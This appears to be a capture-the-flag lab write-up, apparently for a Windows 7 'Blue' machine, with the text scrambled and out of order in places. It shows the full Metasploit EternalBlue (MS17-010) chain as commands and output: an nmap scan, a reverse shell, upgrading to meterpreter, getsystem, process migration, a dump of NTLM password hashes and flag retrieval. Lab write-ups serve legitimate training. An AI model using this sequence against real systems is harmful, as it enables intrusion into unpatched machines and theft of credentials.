+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  12582912  fil   2009-07-13 22:34:08 -0400  SYSTEM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SYSTEM.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  TxR
+100666/rw-rw-rw-  34        fil   2018-12-12 22:48:22 -0500  flag2.txt
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  systemprofile
+
+meterpreter &gt; cat flag2.txt 
+flag{sam_database_elevated_access}
+</code></pre><ol start="3">
+<li></li>
+</ol>
+<pre><code>meterpreter &gt; cd Users 
+lmeterpreter &gt; ls
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  All Users
+40555/r-xr-xr-x   8192  dir   2009-07-13 23:20:08 -0400  Default
+40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  Default User
+40777/rwxrwxrwx   8192  dir   2018-12-12 22:13:28 -0500  Jon
+40555/r-xr-xr-x   4096  dir   2009-07-13 23:20:08 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini
+
+meterpreter &gt; cd Jon 
+meterpreter &gt; ls
+Listing: C:\Users\Jon
+=====================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  AppData
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Application Data
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:37 -0500  Contacts
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Cookies
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Desktop
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Documents
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Downloads
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Favorites
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Links
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Local Settings
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Music
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  My Documents
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  NetHood
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Pictures
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  PrintHood
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Recent
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Saved Games
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:45 -0500  Searches
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  SendTo
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Start Menu
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Templates
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Videos
+100666/rw-rw-rw-  262144  fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG1
+100666/rw-rw-rw-  0       fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2018-12-12 22:13:31 -0500  ntuser.ini
+
+meterpreter &gt; cd Documents 
+meterpreter &gt; ls
+Listing: Ck 1:
+
+1. We use the usual nmap to scan the machine. Note that it says that the
+   machine does not respond to ICMP requests. So, we have to use ```-Pn```
+with nmap for scanning
+</code></pre><p>nmap -sC -sV -Pn -oN nmap-out 10.10.221.176</p>
+<pre><code>
+The results:
+</code></pre><h1 id="nmap-780-scan-initiated-wed-mar-25-102626-2020-as-nmap--sc--sv--pn--on-1">Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN</h1>
+<p>nmap.out 10.10.221.176
+Nmap scan report for 10.10.221.176
+Host is up (0.23s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack
+1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time.
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>Host script results:
+|_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <!-- raw HTML omitted -->, NetBIOS MAC:
+02:d2:17:3d:b2:64 (unknown)
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-03-25T09:28:55-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-03-25T14:28:55
+|_  start_date: 2020-03-25T14:11:35</p>
+<p>Service detection performed. Please report any incorrect results at
+<a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
+<h1 id="nmap-done-at-wed-mar-25-103001-2020----1-ip-address-1-host-up-scanned-in-1">Nmap done at Wed Mar 25 10:30:01 2020 &ndash; 1 IP address (1 host up) scanned in</h1>
+<p>215.17 seconds</p>
+<pre><code>
+
+2. We find 3 ports with port number under 1000:
+* 135
+* 139
+* 445
+
+
+3. We see that the machine is running Windows &amp; SP 1. We look for exploits for
+   this OS on google, and one that mostly comes up is the vulnerability
+ms17-010.
+
+
+# Task 2: Gain access
+
+1. We start metasploit
+</code></pre><p>msfconsole
+[-] ***rting the Metasploit Framework console&hellip;<br>
+[-] * WARNING: No database support: No database YAML file                                                                                        <br>
+[-] ***</p>
+<p>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm <code>?MMM             MMMM</code> dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+<a href="https://metasploit.com">https://metasploit.com</a></p>
+<pre><code>   =[ metasploit v5.0.60-dev                          ]
+</code></pre>
+<ul>
+<li>&ndash; &ndash;=[ 1947 exploits - 1089 auxiliary - 333 post       ]</li>
+<li>&ndash; &ndash;=[ 556 payloads - 45 encoders - 10 nops            ]</li>
+<li>&ndash; &ndash;=[ 7 evasion                                       ]</li>
+</ul>
+<pre><code>
+2. We search for exploits for the vulnerability ms17-010:
+</code></pre><p>msf5 &gt; search ms17-010</p>
+<h1 id="matching-modules-1">Matching Modules</h1>
+<h1 id="name-------------------------------------------disclosure-date--rank-1">Name                                           Disclosure Date  Rank</h1>
+<p>Check  Description</p>
+<hr>
+<pre><code>  -----  -----------
+</code></pre>
+<p>0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal
+Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote
+Windows Command Execution
+1  auxiliary/scanner/smb/smb_ms17_010                              normal
+Yes    MS17-010 SMB RCE Detection
+2  exploit/windows/smb/doublepulsar_rce           2017-04-14       great
+Yes    DOUBLEPULSAR Payload Execution and Neutralization
+3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average
+Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average
+No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal
+Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote
+Windows Code Execution</p>
+<pre><code>
+Here, we will use the exploit ```exploit/windows/smb/ms17_010_eternalblue```.
+</code></pre><p>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;</p>
+<pre><code>## Info:
+Description:
+  This module is a port of the Equation Group ETERNALBLUE exploit, 
+  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
+  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
+  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
+  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
+  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
+  Actual RIP hijack is later completed in 
+  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
+  not trigger 100% of the time, and should be run continuously until 
+  triggered. It seems like the pool will get hot streaks and need a 
+  cool down period before the shells rain in again. The module will 
+  attempt to use Anonymous login, by default, to authenticate to 
+  perform the exploit. If the user supplies credentials in the 
+  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
+  On some systems, this module may cause system instability and 
+  crashes, such as a BSOD or a reboot. This may be more likely with 
+  some payloads.
+
+References:
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
+  https://cvedetails.com/cve/CVE-2017-0143/
+  https://cvedetails.com/cve/CVE-2017-0144/
+  https://cvedetails.com/cve/CVE-2017-0145/
+  https://cvedetails.com/cve/CVE-2017-0146/
+  https://cvedetails.com/cve/CVE-2017-0147/
+  https://cvedetails.com/cve/CVE-2017-0148/
+  https://github.com/RiskSense-Ops/MS17-010
+
+
+3. We check the options for this exploit:
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; options</p>
+<p>Module options (exploit/windows/smb/ms17_010_eternalblue):</p>
+<p>Name           Current Setting  Required  Description</p>
+<hr>
+<p>RHOSTS                          yes       The target host(s), range CIDR
+identifier, or hosts file with syntax &lsquo;file:<!-- raw HTML omitted -->&rsquo;
+RPORT          445              yes       The target port (TCP)
+SMBDomain      .                no        (Optional) The Windows domain to
+use for authentication
+SMBPass                         no        (Optional) The password for the
+specified username
+SMBUser                         no        (Optional) The username to
+authenticate as
+VERIFY_ARCH    true             yes       Check if remote architecture
+matches exploit Target.
+VERIFY_TARGET  true             yes       Check if remote OS matches exploit
+Target.</p>
+<p>Exploit target:</p>
+<p>Id  Name</p>
+<hr>
+<p>0   Windows 7 and Server 2008 R2 (x64) All Service Packs</p>
+<pre><code>
+We see that we have to set out RHOSTS whick will be our target machine.So, we
+set RHOST with the ip address of the windows machine from the site:
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.221.176
+RHOSTS =&gt; 10.10.221.176</p>
+<pre><code>
+4. We run the exploit.
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</p>
+<p>[<em>] Started reverse TCP handler on 10.8.30.133:4444
+[+] 10.10.247.170:445     - Host is likely VULNERABLE to MS17-010! - Windows
+7 Professional 7601 Service Pack 1 x64 (64-bit)
+[</em>] 10.10.247.170:445 - Connecting to target for exploitation.
+[+] 10.10.247.170:445 - Connection established for exploitation.
+[+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply
+[<em>] 10.10.247.170:445 - CORE raw buffer dump (42 bytes)
+[</em>] 10.10.247.170:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66
+65 73  Windows 7 Profes
+[<em>] 10.10.247.170:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65
+72 76  sional 7601 Serv
+[</em>] 10.10.247.170:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31
+ice Pack 1   <br>
+[+] 10.10.247.170:445 - Target arch selected valid for arch indicated by
+DCE/RPC reply
+[<em>] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations.
+[</em>] 10.10.247.170:445 - Sending all but last fragment of exploit packet
+[<em>] 10.10.247.170:445 - Starting non-paged pool grooming
+[+] 10.10.247.170:445 - Sending SMBv2 buffers
+[+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to
+SMBv2 buffer.
+[</em>] 10.10.247.170:445 - Sending final SMBv2 buffers.
+[<em>] 10.10.247.170:445 - Sending last fragment of exploit packet!
+[</em>] 10.10.247.170:445 - Receiving response from exploit packet
+[+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully
+(0xC000000D)!
+[<em>] 10.10.247.170:445 - Sending egg to corrupted connection.
+[</em>] 10.10.247.170:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.8.30.133:4444 -&gt; 10.10.247.170:49184) at
+2020-03-25 15:17:21 -0400
+[+] 10.10.247.170:445</p>
+<ul>
+<li>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445</li>
+<li>=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445</li>
+<li>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</li>
+</ul>
+<p>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</p>
+<p>C:\Windows\system32&gt;</p>
+<pre><code>
+Voila! we got a shell!
+
+
+
+5. We background the shell using Ctrl+z
+
+
+
+
+## Task 3: Escalate 
+
+1. In order to convert the shell to a meterpreter shell, we use the following
+   exploit:
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use
+post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) &gt;</p>
+<pre><code>
+
+2. We check the options for this exploit:
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; options</p>
+<p>Module options (post/multi/manage/shell_to_meterpreter):</p>
+<p>Name     Current Setting  Required  Description</p>
+<hr>
+<p>HANDLER  true             yes       Start an exploit/multi/handler to
+receive the connection
+LHOST                     no        IP of host that will receive the
+connection from the payload (Will try to auto detect).
+LPORT    4433             yes       Port for payload to connect to.
+SESSION                   yes       The session to run this module on.</p>
+<pre><code>
+So the option that we are required to change is ```SESSION```
+
+
+
+3. In order to ser the option session we need the session id of our previously
+   opened shell. To find the session id, we enter the command ```sessions -l```
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -l</p>
+<h1 id="active-sessions-2">Active sessions</h1>
+<p>Id  Name  Type               Information                           Connection</p>
+<hr>
+<p>1         shell x64/windows  Microsoft Windows [Version 6.1.7601]
+10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)</p>
+<pre><code>
+So, the session id is 1. We set the session
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1</p>
+<pre><code>
+
+4. We run the exploit.
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; run</p>
+<p>[<em>] Upgrading session ID: 1
+[</em>] Starting exploit/multi/handler
+[<em>] Started reverse TCP handler on 10.8.30.133:4433
+[</em>] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) &gt;
+[<em>] Sending stage (180291 bytes) to 10.10.247.170
+[</em>] Meterpreter session 2 opened (10.8.30.133:4433 -&gt; 10.10.247.170:49193) at
+2020-03-25 15:24:05 -0400
+[*] Stopping exploit/multi/handler</p>
+<p>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions</p>
+<h1 id="active-sessions-3">Active sessions</h1>
+<p>Id  Name  Type                     Information
+Connection</p>
+<hr>
+<hr>
+<p>1         shell x64/windows        Microsoft Windows [Version 6.1.7601]
+10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)
+2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC
+10.8.30.133:4433 -&gt; 10.10.247.170:49193 (10.10.247.170)</p>
+<pre><code>
+We see that we got a meterpreter shell!
+
+
+5. We can interact with th meterpreter shell using the following command:
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 2
+[*] Starting interaction with 2&hellip;</p>
+<p>meterpreter &gt;</p>
+<pre><code>
+6. We run getsystem, shell and whoami to check if we have escalated to NT
+   AUTHORITY\SYSTEM
+</code></pre><p>meterpreter &gt; getsystem
+&hellip;got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter &gt; shell
+Process 2216 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</p>
+<p>C:\Windows\system32&gt;whoami
+whoami
+nt authority\system</p>
+<p>C:\Windows\system32&gt;</p>
+<pre><code>
+So, we are in fact system!
+
+
+7. We enter the command ```ps``` to view the running processes
+</code></pre><p>C:\Windows\system32&gt;^Z
+Background channel 1? [y/N]  y
+meterpreter &gt; ps</p>
+<h1 id="process-list">Process List</h1>
+<p>PID   PPID  Name                  Arch  Session  User
+Path</p>
+<hr>
+<hr>
+<p>0     0     [System Process]                                                <br>
+4     0     System                x64   0                                   <br>
+396   652   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM
+C:\Windows\System32\LogonUI.exe
+416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\smss.exe
+428   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+536   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+552   544   csrss.exe             x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\csrss.exe
+600   544   wininit.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\wininit.exe
+612   592   csrss.exe             x64   1        NT AUTHORITY\SYSTEM
+C:\Windows\System32\csrss.exe
+652   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM
+C:\Windows\System32\winlogon.exe
+700   600   services.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\services.exe
+708   600   lsass.exe             x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\lsass.exe
+716   600   lsm.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\lsm.exe
+824   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+892   700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+940   700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+1012  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\wbem\WmiPrvSE.exe
+1068  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+1160  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+1292  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\spoolsv.exe
+1328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+1380  2856  powershell.exe        x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+1392  700   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+1468  700   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Xentools\LiteAgent.exe
+1588  700   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+1780  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+1856  2200  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+1936  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+1940  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+2144  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+2200  700   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+2216  2504  cmd.exe               x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\SysWOW64\cmd.exe
+2328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+2360  700   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\sppsvc.exe
+2428  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+2504  1380  powershell.exe        x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+2560  700   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\vds.exe
+2664  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\SearchIndexer.exe
+2796  1292  cmd.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\cmd.exe
+3020  700   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\servicing\TrustedInstaller.exe</p>
+<pre><code>
+We write down the process id 2796.
+
+
+8. We migrate to the process whose id we noted:
+</code></pre><p>meterpreter &gt; migrate 2796
+[<em>] Migrating from 2504 to 2796&hellip;
+[</em>] Migration completed successfully.</p>
+<pre><code>
+## Task 4: Cracking
+
+1. We run the command hashdump.
+</code></pre><p>meterpreter &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</p>
+<pre><code>
+So the user is Jon.
+
+
+2. Windows uses LM and NTLM hashing. We crack the hashes using hashcat
+</code></pre><pre><code>
+
+
+## Task 5: Find flags! 
+
+1. 
+</code></pre><h1 id="listing-c">meterpreter &gt; cd C:\<br>
+meterpreter &gt; ls
+Listing: C:\</h1>
+<p>Mode              Size     Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0        dir   2009-07-13 23:18:56 -0400  $Recycle.Bin
+40777/rwxrwxrwx   0        dir   2009-07-14 01:08:56 -0400  Documents and
+Settings
+40777/rwxrwxrwx   0        dir   2009-07-13 23:20:08 -0400  PerfLogs
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files (x86)
+40777/rwxrwxrwx   4096     dir   2009-07-13 23:20:08 -0400  ProgramData
+40777/rwxrwxrwx   0        dir   2018-12-12 22:13:22 -0500  Recovery
+40777/rwxrwxrwx   4096     dir   2018-12-12 18:01:17 -0500  System Volume
+Information
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Users
+40777/rwxrwxrwx   16384    dir   2009-07-13 23:20:08 -0400  Windows
+100666/rw-rw-rw-  24       fil   2018-12-12 22:47:39 -0500  flag1.txt
+0000/&mdash;&mdash;&mdash;    2141120  fif   1970-01-30 18:20:00 -0500  hiberfil.sys
+0000/&mdash;&mdash;&mdash;    2141120  fif   1970-01-30 18:20:00 -0500  pagefile.sys</p>
+<p>meterpreter &gt; cat flag1.txt
+flag{access_the_machine}</p>
+<pre><code>
+2. 
+</code></pre><h1 id="listing-cwindowssystem32config">meterpreter &gt; pwd
+C:\Windows\System32\config
+meterpreter &gt; ls
+Listing: C:\Windows\System32\config</h1>
+<p>Mode              Size      Type  Last modified              Name</p>
+<hr>
+<p>100666/rw-rw-rw-  28672     fil   2009-07-14 01:32:39 -0400  BCD-Template
+100666/rw-rw-rw-  25600     fil   2009-07-14 01:38:35 -0400  BCD-Template.LOG
+100666/rw-rw-rw-  18087936  fil   2009-07-13 22:34:08 -0400  COMPONENTS
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  COMPONENTS.LOG
+100666/rw-rw-rw-  13312     fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG2
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536     fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
+100666/rw-rw-rw-  65536     fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  DEFAULT
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  DEFAULT.LOG
+100666/rw-rw-rw-  177152    fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
